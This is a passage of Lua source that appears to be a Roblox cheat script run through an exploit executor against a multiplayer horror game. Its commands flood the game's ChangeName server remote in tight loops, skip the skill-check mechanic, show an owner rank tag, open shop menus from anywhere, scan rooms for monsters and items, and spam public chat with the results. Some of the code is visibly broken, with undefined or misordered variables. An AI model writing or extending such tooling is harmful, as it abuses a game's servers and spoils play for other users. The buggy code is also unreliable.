		local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"			
		local nameTag = humanoidRootPart:WaitForChild"NameTag"			
		local frame = nameTag:WaitForChild"Frame"

		local displayNameLabel = frame:WaitForChild"DisplayName"			
		local userNameLabel = frame:WaitForChild"UserName"

		if savedDisplayName and savedUserName then
			displayNameLabel.Text = savedDisplayName
			userNameLabel.Text = savedUserName
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local scriptEnabled2 = false

addcommand("enableglitchedroleplayname", "egrpn", function()
	scriptEnabled2 = true
	while scriptEnabled2 do
		local randomText = randomstring(16)

		-- Invoke the server to change the name
		local args = {
			[1] = randomText,
			[2] = 0
		}

		local character = noxious["local player"].Character
		if character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart:FindFirstChild("NameTag") then
			local nameTag = character.HumanoidRootPart.NameTag
			if nameTag:FindFirstChild("ChangeName") then
				nameTag.ChangeName:InvokeServer(unpack(args))
			end
		end

		wait(0)
	end
end)

addcommand("disableglitchedroleplayname", "dgrpn", function()
	scriptEnabled2 = false

	-- Restore original name using server invocation
	local character = noxious["local player"].Character
	if character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart:FindFirstChild("NameTag") then
		local nameTag = character.HumanoidRootPart.NameTag
		if nameTag:FindFirstChild("ChangeName") then
			local args = {
				[1] = noxious["local player"].DisplayName, -- Original Display Name
				[2] = 0
			}
			nameTag.ChangeName:InvokeServer(unpack(args))
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local isrunofs30znametagenabled = false -- Control variable to enable/disable the script

function runofs30znametag()
	game:GetService"Players"		

	local playerName = noxious["local player"].Name

	-- Locate player model and NameTag
	local playersFolder = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"		
	local playerModel = playersFolder and playersFolder:FindFirstChild(playerName)

	if game.PlaceId == noxious["test game"] then
		noxious["top frame"] = noxious["local player"].PlayerGui:FindFirstChild(noxious["noxious screen gui"].Name).mainframe:WaitForChild"TopFrame"		
	else
		noxious["top frame"] = game:GetService"CoreGui".Noxious.mainframe:WaitForChild"TopFrame"		
	end

	local welcome = noxious["top frame"]:WaitForChild"welcome"		
	local welcome2 = noxious["top frame"]:WaitForChild"welcome2"
	-- Check for NameTag labels

	local displayNameLabel, userNameLabel
	if playerModel then
		local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"			
		local nameTag = humanoidRootPart:WaitForChild"NameTag"			
		local frame = nameTag:WaitForChild"Frame"

		displayNameLabel = frame:WaitForChild"DisplayName"			
		userNameLabel = frame:WaitForChild"UserName"		
	end

	-- Message sequence with individual delays
	local messages = {
		{display = "Sempiterna", user = "(@Sempiterna)", welcome = "Welcome, Sempiterna!", welcome2 = "(@Sempiterna)", delay = 0.55},
		{display = "Sempiterna sit", user = "(@Sempiterna sit)", welcome = "Welcome, Sempiterna sit!", welcome2 = "(@Sempiterna sit)", delay = 0.15},
		{display = "Sempiterna sit beatae,", user = "(@Sempiterna sit beatae,)", welcome = "Welcome, Sempiterna sit beatae!", welcome2 = "(@Sempiterna sit beatae,)", delay = 0.7},
		{display = "Sempiterna sit beatae, trinitati", user = "(@Sempiterna sit beatae, trinitati)", welcome = "Welcome, Sempiterna sit beatae, trinitati!", welcome2 = "(@Sempiterna sit beatae, trinitati)", delay = 0.7},
		{display = "Sempiterna sit beatae, trinitati gloria.", user = "(@Sempiterna sit beatae, trinitati gloria.)", welcome = "Welcome, Sempiterna sit beatae, trinitati gloria!", welcome2 = "(@Sempiterna sit beatae, trinitati gloria.)", delay = 0.7},
		{display = "Aequa", user = "(@Aequa)", welcome = "Welcome, Aequa!", welcome2 = "(@Aequa)", delay = 0.2},
		{display = "Aequa patri", user = "(@Aequa patri)", welcome = "Welcome, Aequa patri!", welcome2 = "(@Aequa patri)", delay = 0.4},
		{display = "Aequa patri filioque,", user = "(@Aequa patri filioque,)", welcome = "Welcome, Aequa patri filioque!", welcome2 = "(@Aequa patri filioque,)", delay = 0.7},
		{display = "Aequa patri filioque, par", user = "(@Aequa patri filioque, par)", welcome = "Welcome, Aequa patri filioque, par!", welcome2 = "(@Aequa patri filioque, par)", delay = 0.2},
		{display = "Aequa patri filioque, par decus", user = "(@Aequa patri filioque, par decus)", welcome = "Welcome, Aequa patri filioque, par decus!", welcome2 = "(@Aequa patri filioque, par decus)", delay = 0.3},
		{display = "Aequa patri filioque, par decus paraclito.", user = "(@Aequa patri filioque, par decus paraclito.)", welcome = "Welcome, Aequa patri filioque, par decus paraclito!", welcome2 = "(@Aequa patri filioque, par decus paraclito.)", delay = 0.77}
	}

	-- Main loop
	while isrunofs30znametagenabled do
		for _, message in ipairs(messages) do
			if not isrunofs30znametagenabled then return end

			-- Update NameTag labels if detected
			if displayNameLabel and userNameLabel then
				displayNameLabel.Text = message.display
				userNameLabel.Text = message.user
				welcome.Text = message.welcome
				welcome2.Text = message.welcome2
			end

			-- Update welcome labels
			if welcome then welcome.Text = message.welcome end
			if welcome2 then welcome2.Text = message.welcome2 end

			wait(message.delay)
		end
	end
end

addcommand("enablerunofs30znametag", "erosnt", function()
	isrunofs30znametagenabled = true
	runofs30znametag()
end)

addcommand("disablerunofs30znametag", "drosnt", function()
	isrunofs30znametagenabled = false


	game:GetService"Players"		


	local playersFolder = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"		
	local playerModel = playersFolder and playersFolder:FindFirstChild(noxious["local player"].Name)

	-- Restore NameTag text
	if playerModel then
		local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"			
		local nameTag = humanoidRootPart:WaitForChild"NameTag"			
		local frame = nameTag:WaitForChild"Frame"

		local displayNameLabel = frame:WaitForChild"DisplayName"			
		local userNameLabel = frame:WaitForChild"UserName"

		displayNameLabel.Text = noxious["local player"].DisplayName
		userNameLabel.Text = "(@" .. noxious["local player"].Name .. ")"
	end

	-- Restore welcome text
	if noxious["top frame"] then
		local welcome = noxious["top frame"]:FindFirstChild"welcome"			
		local welcome2 = noxious["top frame"]:FindFirstChild"welcome2"

		if welcome then welcome.Text = "Welcome, " .. noxious["local player"].DisplayName .. "!" end
		if welcome2 then welcome2.Text = "(@" .. noxious["local player"].Name .. ")" end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local isrunofs30rpnameenabled = false -- Control variable to enable/disable the script

function runofs30zrpname()
	local character = noxious["local player"].Character
	if not character then return end

	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then return end

	local nameTag = humanoidRootPart:FindFirstChild("NameTag")
	if not nameTag then return end

	local changeNameRemote = nameTag:FindFirstChild("ChangeName")
	if not changeNameRemote then return end

	-- Message sequence with individual delays
	local messages = {
		{display = "Sempiterna", delay = 0.55},
		{display = "Sempiterna sit", delay = 0.15},
		{display = "Sempiterna sit beatae,", delay = 0.7},
		{display = "Trinitati", delay = 0.7},
		{display = "Trinitati gloria.", delay = 0.7},
		{display = "Aequa", delay = 0.2},
		{display = "Aequa patri", delay = 0.4},
		{display = "Aequa patri filioque,", delay = 0.7},
		{display = "Par", delay = 0.2},
		{display = "Par decus", delay = 0.3},
		{display = "Par decus paraclito.", delay = 0.77}
	}

	-- Main loop
	while isrunofs30rpnameenabled do
		for _, message in ipairs(messages) do
			if not isrunofs30rpnameenabled then return end

			-- Send the updated name to the server
			local args = {
				[1] = message.display,
				[2] = 0
			}
			changeNameRemote:InvokeServer(unpack(args))

			wait(message.delay)
		end
	end
end

addcommand("enablerunofs30zroleplayname", "erosrpn", function()
	isrunofs30rpnameenabled = true
	runofs30zrpname()
end)

addcommand("disablerunofs30zroleplayname", "drosrpn", function()
	isrunofs30rpnameenabled = false

	-- Restore the original name using the server
	local character = noxious["local player"].Character
	if not character then return end

	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then return end

	local nameTag = humanoidRootPart:FindFirstChild("NameTag")
	if not nameTag then return end

	local changeNameRemote = nameTag:FindFirstChild("ChangeName")
	if not changeNameRemote then return end

	local args = {
		[1] = noxious["local player"].DisplayName, -- Original Display Name
		[2] = 0
	}
	changeNameRemote:InvokeServer(unpack(args))
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("showownertag", "sot", function()
	local groupRankLabel = character:WaitForChild"HumanoidRootPart":WaitForChild"NameTag":WaitForChild"Frame":WaitForChild"GroupRank"		
	if groupRankLabel then
		groupRankLabel.Visible = true
	end
end)

addcommand("hideownertag", "hot", function()
	local groupRankLabel = character:WaitForChild"HumanoidRootPart":WaitForChild"NameTag":WaitForChild"Frame":WaitForChild"GroupRank"		
	if groupRankLabel then
		groupRankLabel.Visible = false
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("antiskillcheck", "ask", function()
	local player = game:GetService"Players".LocalPlayer
	local skillCheckFrame = player.PlayerGui.ScreenGui.Menu:FindFirstChild"SkillCheckFrame"

	if skillCheckFrame then
		skillCheckFrame.Parent = game:GetService("ReplicatedStorage")
	end
end)

addcommand("unantiskillcheck", "uask", function()
	local player = game:GetService"Players".LocalPlayer
	local skillCheckFrame = game:GetService("ReplicatedStorage"):FindFirstChild"SkillCheckFrame"

	if skillCheckFrame then
		skillCheckFrame.Parent = player.PlayerGui.ScreenGui.Menu
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("antipopups", "apu", function()
	local popup = noxious["local player"].PlayerGui.ScreenGui:FindFirstChild"PopUp"

	if popup then
		popup.Parent = game:GetService("ReplicatedStorage")
	end
end)

addcommand("unantipopups", "uapu", function()
	local popup = game:GetService("ReplicatedStorage"):FindFirstChild"PopUp"

	if popup then
		popup.Parent = noxious["local player"].PlayerGui.ScreenGui
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spectate", "view", function(target)
	execcmd("unview")
	local players = noxious["players"]
	local localPlayer = players.LocalPlayer
	local camera = workspace.CurrentCamera

	-- Resolve the target player
	local function getTargetPlayer(target)
		if target == "me" then
			return localPlayer
		elseif target == "random" then
			local allPlayers = players:GetPlayers()
			if #allPlayers > 0 then
				return allPlayers[math.random(1, #allPlayers)]
			end
		elseif target == "others" then
			return nil
		elseif target == "all" then
			return nil -- Invalid for this command
		else
			-- Find player by partial name
			for _, player in ipairs(players:GetPlayers()) do
				if player.Name:lower():find(target:lower(), 1, true) then
					return player
				end
			end
		end
		return nil
	end

	local targetPlayer = getTargetPlayer(target)

	if not targetPlayer or targetPlayer == localPlayer then
		return
	end

	-- Find the target's head
	local targetCharacter = targetPlayer.Character
	if targetCharacter and targetCharacter:FindFirstChild("Head") then
		camera.CameraSubject = targetCharacter.Head
	end
end)

addcommand("unspectate", "unview", function()
	local players = noxious["players"]
	local localPlayer = players.LocalPlayer
	local camera = workspace.CurrentCamera

	-- Ensure the local player exists and has a head
	local character = localPlayer.Character
	if character and character:FindFirstChild("Head") then
		camera.CameraSubject = character.Head
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("enablechatguider", "ecg", function()
	spawn(function() execcmd("etcg") end)
	spawn(function() execcmd("elhcg") end)
	spawn(function() execcmd("edpcg") end)
	spawn(function() execcmd("ericg") end)
end)

addcommand("disablechatguider", "dcg", function()
	spawn(function() execcmd("dtcg") end)
	spawn(function() execcmd("dlhcg") end)
	spawn(function() execcmd("ddpcg") end)
	spawn(function() execcmd("dricg") end)
end)

-------------------------------------------------------------------------------------------------------------------------------

local notifiedTwisteds = {}
local notifyTwistedsEnabled = false -- Flag to control the loop
local twistedsMessageSent = false -- Flag to track if the Twisteds message has been sent
local lastModelTimestamp = tick() -- Timestamp for tracking when the last model was added

-- Function to start monitoring Twisteds

function startTwistedsNotifyLoop()
	local ChatService = game:GetService("TextChatService")
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if not currentRoom then return end

	-- Loop to check for Twisteds
	while notifyTwistedsEnabled do
		local newTwisteds = {} -- Store new Twisteds for this cycle
		local totalMonsters = 0 -- Count the total number of monsters
		local newModelsGenerated = false -- Flag to track if new models have been generated in this cycle

		-- Check if CurrentRoom is empty
		if #currentRoom:GetChildren() == 0 then
			notifiedTwisteds = {} -- Reset notifiedTwisteds when CurrentRoom is empty
			twistedsMessageSent = false -- Reset the message sent flag
		else
			-- Collect all Twisteds
			for _, model in ipairs(currentRoom:GetChildren()) do
				if model:IsA("Model") then
					local monstersFolder = model:FindFirstChild("Monsters")
					if monstersFolder then
						for _, monster in ipairs(monstersFolder:GetChildren()) do
							totalMonsters += 1 -- Increment the count of monsters
							local cleanedName = cleanMonsterName(monster.Name) -- Clean the name

							-- If it's a new Twisted, add it to the list and mark it as notified
							if not notifiedTwisteds[cleanedName] then
								table.insert(newTwisteds, cleanedName)
								notifiedTwisteds[cleanedName] = true
								newModelsGenerated = true -- New model has been generated in this cycle
								lastModelTimestamp = tick() -- Update the timestamp when a new model is generated
							end
						end
					end
				end
			end
		end

		-- If there are more than one monster and the message hasn't been sent yet
		if totalMonsters > 1 and #newTwisteds > 0 and not twistedsMessageSent then
			local channel = ChatService.TextChannels:FindFirstChild("RBXGeneral")
			if channel then
				-- Send the list of new Twisteds only once
				wait(0.5)
				channel:SendAsync("Twisteds: " .. table.concat(newTwisteds, ", "))
				wait(0.5)
				twistedsMessageSent = true -- Mark the message as sent
			end
		end

		-- If no monsters are found, reset the twistedsMessageSent flag
		if totalMonsters == 0 then
			twistedsMessageSent = false
		end

		-- Cleanup Twisteds that no longer exist in the room
		for twistedName, _ in pairs(notifiedTwisteds) do
			local stillExists = false
			for _, model in ipairs(currentRoom:GetChildren()) do
				local monstersFolder = model:FindFirstChild("Monsters")
				if monstersFolder and monstersFolder:FindFirstChild(twistedName) then
					stillExists = true
					break
				end
			end
			if not stillExists then
				notifiedTwisteds[twistedName] = nil -- Remove from the list if no longer present
			end
		end

		task.wait(0.1) -- Small delay between checks
	end
end

-- Function to enable the loop
addcommand("enabletwistedschatguider", "etcg", function()
	if notifyTwistedsEnabled then return end -- Prevent starting the loop if already running
	notifyTwistedsEnabled = true
	twistedsMessageSent = false -- Reset the flag when the loop is enabled
	task.spawn(startTwistedsNotifyLoop) -- Use task.spawn to run the loop asynchronously
end)

-- Function to disable the loop
addcommand("disabletwistedschatguider", "dtcg", function()
	notifyTwistedsEnabled = false
end)

-------------------------------------------------------------------------------------------------------------------------------

local healthChatConnection -- Holds the connection for the monitoring loop
local chatnotifiedPlayers = {} -- Table to track players already chatted about

-- Helper function to chat the low health message
function lowhealthchatguiding(username, characterName)
	local ChatService = game:GetService("TextChatService")
	local channel = ChatService.TextChannels:FindFirstChild("RBXGeneral")
	if channel then
		channel:SendAsync(username .. " (" .. characterName .. ") is at 1 heart.")
	end
end

-- Function to start monitoring
addcommand("enablelowhealthchatguider", "elhcg", function()
	local inGamePlayers = workspace:FindFirstChild("InGamePlayers")
	if healthChatConnection or not inGamePlayers then
		return -- Already monitoring or folder not found
	end

	healthChatConnection = noxious["run service"].RenderStepped:Connect(function()
		for _, model in ipairs(inGamePlayers:GetChildren()) do
			-- Check if the child is a valid player model (including local player)
			if model:IsA("Model") then
				-- Find the Humanoid within the model
				local humanoid = model:FindFirstChildOfClass("Humanoid")
				local config = model:FindFirstChild("Config")
				local characterName = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"

				if humanoid and humanoid.Health == 1 and not chatnotifiedPlayers[model.Name] then
					-- Chat and mark the player as chatted about
					lowhealthchatguiding(model.Name, characterName)
					chatnotifiedPlayers[model.Name] = true
				elseif humanoid and humanoid.Health > 1 then
					-- Reset notification if the player's health increases
					chatnotifiedPlayers[model.Name] = nil
				end
			end
		end
	end)
end)

-- Function to stop monitoring
addcommand("disablelowhealthchatguider", "dlhcg", function()
	if healthChatConnection then
		healthChatConnection:Disconnect()
		healthChatConnection = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local deadChatConnection -- Holds the connection for the monitoring loop

local playerCharacterNames = {} -- Table to track the saved character names for players

-- Helper function to chat the player removal message
function deadchatguiding(username, characterName)
	local ChatService = game:GetService("TextChatService")
	local channel = ChatService.TextChannels:FindFirstChild("RBXGeneral")
	if channel then
		channel:SendAsync(username .. " (" .. characterName .. ") died or left the game.")
	end
end

-- Function to start monitoring
addcommand("enabledeadplayerchatguider", "edpcg", function()
	local inGamePlayers = workspace:FindFirstChild("InGamePlayers")
	if deadChatConnection or not inGamePlayers then
		return -- Already monitoring or folder not found
	end

	deadChatConnection = noxious["run service"].RenderStepped:Connect(function()
		local currentPlayers = {}

		-- Track all players currently in the folder
		for _, model in ipairs(inGamePlayers:GetChildren()) do
			if model:IsA("Model") then
				local config = model:FindFirstChild("Config")
				local characterName = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"
				currentPlayers[model.Name] = characterName

				-- Save the character name if it's a new player or hasn't been saved yet
				if not playerCharacterNames[model.Name] then
					playerCharacterNames[model.Name] = characterName
				end
			end
		end

		-- Check for players who have been removed
		for username, characterName in pairs(playerCharacterNames) do
			if not currentPlayers[username] then
				-- Chat the removal message with the saved character name and remove from tracking
				deadchatguiding(username, characterName)
				playerCharacterNames[username] = nil -- Remove the character name after the player is removed
			end
		end
	end)
end)

-- Function to stop monitoring
addcommand("disabledeadplayerchatguider", "ddpcg", function()
	if deadChatConnection then
		deadChatConnection:Disconnect()
		deadChatConnection = nil
		playerCharacterNames = {} -- Clear the saved character names
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local chattedItems = {}

local targetItems = {
	"Bandage",
	"HealthKit",
	"SmokeBomb",
	"EjectButton",
	"Valve",
	"Box chocolates",
	"AirHorn",
	"EnigmaCandy",
	"JumperCable",
	"PopBottle"
}

local chatItemsLoopEnabled = false -- Flag to control the loop

function startChatItemsLoop()
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if not currentRoom then return end

	-- Start the loop to check for items
	while chatItemsLoopEnabled do
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					local itemsFound = {}
					for _, item in ipairs(itemsFolder:GetChildren()) do
						-- Check if the item is in the targetItems table and hasn't been chatted about yet
						if table.find(targetItems, item.Name) and not chattedItems[item.Name] then
							table.insert(itemsFound, item.Name)
							chattedItems[item.Name] = true
						end
					end

					-- Chat out detected items
					if #itemsFound > 0 then
						local ChatService = game:GetService("TextChatService")
						local channel = ChatService.TextChannels:FindFirstChild("RBXGeneral")
						if channel then
							-- Replace item names based on the mapping (HealthKit -> Medkit)
							for i, itemName in ipairs(itemsFound) do
								if itemNameMapping[itemName] then
									itemsFound[i] = itemNameMapping[itemName]
								end
							end

							-- Send chat message
							wait(1)
							channel:SendAsync(table.concat(itemsFound, ", ") .. " has been detected.")
						end
					end
				end
			end
		end

		-- Cleanup items that no longer exist in the room
		for itemName, _ in pairs(chattedItems) do
			local stillExists = false
			for _, model in ipairs(currentRoom:GetChildren()) do
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder and itemsFolder:FindFirstChild(itemName) then
					stillExists = true
					break
				end
			end
			if not stillExists then
				chattedItems[itemName] = nil
			end
		end

		task.wait(0.1) -- Small delay between checks
	end
end

-- Function to enable the loop
addcommand("enablerareitemschatguider", "ericg", function()
	if chatItemsLoopEnabled then return end -- Prevent starting the loop if it's already running
	chatItemsLoopEnabled = true
	task.spawn(startChatItemsLoop) -- Use task.spawn to run the loop asynchronously
end)

-- Function to disable the loop
addcommand("disablerareitemschatguider", "dricg", function()
	chatItemsLoopEnabled = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("enablenotifier", "en", function()
	spawn(function() execcmd("etn") end)
	spawn(function() execcmd("elhn") end)
	spawn(function() execcmd("edpn") end)
	spawn(function() execcmd("erin") end)
end)

addcommand("disablenotifier", "dn", function()
	spawn(function() execcmd("dtn") end)
	spawn(function() execcmd("dlhn") end)
	spawn(function() execcmd("ddpn") end)
	spawn(function() execcmd("drin") end)
end)

-------------------------------------------------------------------------------------------------------------------------------

local notifiedTwisteds2 = {}
local notifyTwistedsEnabled2 = false -- Flag to control the loop
local twistedsMessageSent2 = false -- Flag to track if the Twisteds message has been sent
local lastModelTimestamp2 = tick() -- Timestamp for tracking when the last model was added

-- Helper function to remove "Monster" from the monster name

function cleanMonsterName(name)
	-- Special handling for "RazzleDazzle"
	if name == "RazzleDazzleMonster" then
		return "Razzle & Dazzle"
	end
	return name:gsub("Monster", "") -- Removes the word "Monster" from the name
end

-- Function to start monitoring Twisteds
function startTwistedsNotifierLoop()
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if not currentRoom then return end

	-- Loop to check for Twisteds
	while notifyTwistedsEnabled2 do
		local newTwisteds2 = {} -- Store new Twisteds for this cycle
		local totalMonsters2 = 0 -- Count the total number of monsters
		local newModelsGenerated2 = false -- Flag to track if new models have been generated in this cycle

		-- Check if CurrentRoom is empty
		if #currentRoom:GetChildren() == 0 then
			notifiedTwisteds2 = {} -- Reset notifiedTwisteds when CurrentRoom is empty
			twistedsMessageSent2 = false -- Reset the message sent flag
		else
			-- Collect all Twisteds
			for _, model in ipairs(currentRoom:GetChildren()) do
				if model:IsA("Model") then
					local monstersFolder = model:FindFirstChild("Monsters")
					if monstersFolder then
						for _, monster in ipairs(monstersFolder:GetChildren()) do
							totalMonsters2 += 1 -- Increment the count of monsters
							local cleanedName = cleanMonsterName(monster.Name) -- Clean the name

							-- If it's a new Twisted, add it to the list and mark it as notified
							if not notifiedTwisteds2[cleanedName] then
								table.insert(newTwisteds2, cleanedName)
								notifiedTwisteds2[cleanedName] = true
								newModelsGenerated2 = true -- New model has been generated in this cycle
								lastModelTimestamp2 = tick() -- Update the timestamp when a new model is generated
							end
						end
					end
				end
			end
		end

		-- If there are more than one monster and the message hasn't been sent yet
		if totalMonsters2 > 1 and #newTwisteds2 > 0 and not twistedsMessageSent2 then
			-- Send the list of new Twisteds only once
			wait(0.5)
			notify("Twisteds: " .. table.concat(newTwisteds2, ", "), 5)
			wait(0.5)
			twistedsMessageSent2 = true -- Mark the message as sent
		end

		-- If no monsters are found, reset the twistedsMessageSent flag
		if totalMonsters2 == 0 then
			twistedsMessageSent2 = false
		end

		-- Cleanup Twisteds that no longer exist in the room
		for twistedName2, _ in pairs(notifiedTwisteds2) do
			local stillExists = false
			for _, model in ipairs(currentRoom:GetChildren()) do
				local monstersFolder = model:FindFirstChild("Monsters")
				if monstersFolder and monstersFolder:FindFirstChild(twistedName2) then
					stillExists = true
					break
				end
			end
			if not stillExists then
				notifiedTwisteds2[twistedName2] = nil -- Remove from the list if no longer present
			end
		end

		task.wait(0.1) -- Small delay between checks
	end
end

-- Function to enable the loop
addcommand("enabletwistedsnotifier", "etn", function()
	if notifyTwistedsEnabled2 then return end -- Prevent starting the loop if already running
	notifyTwistedsEnabled2 = true
	twistedsMessageSent2 = false -- Reset the flag when the loop is enabled
	task.spawn(startTwistedsNotifierLoop) -- Use task.spawn to run the loop asynchronously
end)

-- Function to disable the loop
addcommand("disabletwistedsnotifier", "dtn", function()
	notifyTwistedsEnabled2 = false
end)

-------------------------------------------------------------------------------------------------------------------------------

local healthChatConnection2 -- Holds the connection for the monitoring loop
local chatnotifiedPlayers2 = {} -- Table to track players already chatted about

-- Helper function to chat the low health message
function lowhealthchatnotifying(username, characterName)
	notify(username .. " (" .. characterName .. ") is at 1 heart.", 5)
end

-- Function to start monitoring
addcommand("enablelowhealthnotifier", "elhn", function()
	local inGamePlayers = workspace:FindFirstChild("InGamePlayers")
	if healthChatConnection2 or not inGamePlayers then
		return -- Already monitoring or folder not found
	end

	healthChatConnection2 = noxious["run service"].RenderStepped:Connect(function()
		for _, model in ipairs(inGamePlayers:GetChildren()) do
			-- Check if the child is a valid player model (including local player)
			if model:IsA("Model") then
				-- Find the Humanoid within the model
				local humanoid = model:FindFirstChildOfClass("Humanoid")
				local config = model:FindFirstChild("Config")
				local characterName = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"

				if humanoid and humanoid.Health == 1 and not chatnotifiedPlayers2[model.Name] then
					-- Chat and mark the player as chatted about
					lowhealthchatguiding(model.Name, characterName)
					chatnotifiedPlayers2[model.Name] = true
				elseif humanoid and humanoid.Health > 1 then
					-- Reset notification if the player's health increases
					chatnotifiedPlayers2[model.Name] = nil
				end
			end
		end
	end)
end)

-- Function to stop monitoring
addcommand("disablelowhealthnotifier", "dlhn", function()
	if healthChatConnection2 then
		healthChatConnection2:Disconnect()
		healthChatConnection2 = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local deadChatConnection2 -- Holds the connection for the monitoring loop

local playerCharacterNames2 = {} -- Table to track the saved character names for players

-- Helper function to chat the player removal message
function deadnotifier(username, characterName)
	notify(username .. " (" .. characterName .. ") died or left the game.", 5)
end

-- Function to start monitoring
addcommand("enabledeadplayernotifier", "edpn", function()
	local inGamePlayers = workspace:FindFirstChild("InGamePlayers")
	if deadChatConnection2 or not inGamePlayers then
		return -- Already monitoring or folder not found
	end

	deadChatConnection2 = noxious["run service"].RenderStepped:Connect(function()
		local currentPlayers2 = {}

		-- Track all players currently in the folder
		for _, model in ipairs(inGamePlayers:GetChildren()) do
			if model:IsA("Model") then
				local config = model:FindFirstChild("Config")
				local characterName = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"
				currentPlayers2[model.Name] = characterName

				-- Save the character name if it's a new player or hasn't been saved yet
				if not playerCharacterNames2[model.Name] then
					playerCharacterNames2[model.Name] = characterName
				end
			end
		end

		-- Check for players who have been removed
		for username, characterName in pairs(playerCharacterNames2) do
			if not currentPlayers2[username] then
				-- Chat the removal message with the saved character name and remove from tracking
				deadnotifier(username, characterName)
				playerCharacterNames2[username] = nil -- Remove the character name after the player is removed
			end
		end
	end)
end)

-- Function to stop monitoring
addcommand("disabledeadplayernotifier", "ddpn", function()
	if deadChatConnection2 then
		deadChatConnection2:Disconnect()
		deadChatConnection2 = nil
		playerCharacterNames2 = {} -- Clear the saved character names
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local chattedItems2 = {}

local targetItems2 = {
	"Bandage",
	"HealthKit",
	"SmokeBomb",
	"EjectButton",
	"Valve",
	"Box chocolates",
	"AirHorn",
	"EnigmaCandy",
	"JumperCable",
	"PopBottle"
}

local itemNameMapping = {
	["HealthKit"] = "Medkit",
	["SmokeBomb"] = "Smoke bomb",
	["EjectButton"] = "Eject button",
	["ChocolateBox"] = "Box of chocolates",
	["AirHorn"] = "Air horn",
	["EnigmaCandy"] = "Enigma candy",
	["JumperCable"] = "Jumper cable",
	["PopBottle"] = "Bottle of pop",
}

local chatItemsLoopEnabled2 = false -- Flag to control the loop

function startNotifyItemsLoop()
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if not currentRoom then return end

	-- Start the loop to check for items
	while chatItemsLoopEnabled2 do
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					local itemsFound2 = {}
					for _, item in ipairs(itemsFolder:GetChildren()) do
						-- Check if the item is in the targetItems table and hasn't been chatted about yet
						if table.find(targetItems2, item.Name) and not chattedItems2[item.Name] then
							table.insert(itemsFound2, item.Name)
							chattedItems2[item.Name] = true
						end
					end

					-- Chat out detected items
					if #itemsFound2 > 0 then
						-- Replace item names based on the mapping (HealthKit -> Medkit)
						for i, itemName2 in ipairs(itemsFound2) do
							if itemNameMapping[itemName2] then
								itemsFound2[i] = itemNameMapping[itemName2]
							end
						end

						-- Send chat message
						wait(0.5)
						notify(table.concat(itemsFound2, ", ") .. " has been detected.", 5)
					end
				end
			end
		end

		-- Cleanup items that no longer exist in the room
		for itemName2, _ in pairs(chattedItems2) do
			local stillExists2 = false
			for _, model in ipairs(currentRoom:GetChildren()) do
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder and itemsFolder:FindFirstChild(itemName2) then
					stillExists2 = true
					break
				end
			end
			if not stillExists2 then
				chattedItems2[itemName2] = nil
			end
		end

		task.wait(0.1) -- Small delay between checks
	end
end

-- Function to enable the loop
addcommand("enablerareitemsnotifier", "erin", function()
	if chatItemsLoopEnabled2 then return end -- Prevent starting the loop if it's already running
	chatItemsLoopEnabled2 = true
	task.spawn(startNotifyItemsLoop) -- Use task.spawn to run the loop asynchronously
end)

-- Function to disable the loop
addcommand("disablerareitemsnotifier", "drin", function()
	chatItemsLoopEnabled2 = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("opendandysshop", "ods", function()
	game:GetService"Players"		
	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
	local dandyframe = mainGui:WaitForChild"DandyFrame"
	dandyframe.Visible = true
end)

addcommand("opentoonlicenseshop", "otls", function()
	game:GetService"Players"		
	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
	local storeFrame = mainGui:WaitForChild"StoreFrame"
	storeFrame.Visible = true
end)

addcommand("opentrinketsshop", "ots", function()
	game:GetService"Players"		
	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
	local trinketstoreframe = mainGui:WaitForChild"TrinketStoreFrame"
	trinketstoreframe.Visible = true
end)

addcommand("openskinsstore", "oss", function()
	game:GetService"Players"		
	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
	local skinstoreframe = mainGui:WaitForChild"SkinStoreFrame"
	skinstoreframe.Visible = true
end)

addcommand("openskinchanger", "osc", function()
	game:GetService"Players"		
	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
	local skinframe = mainGui:WaitForChild"SkinFrame"
	skinframe.Visible = true
end)

addcommand("openmerchshop", "oms", function()
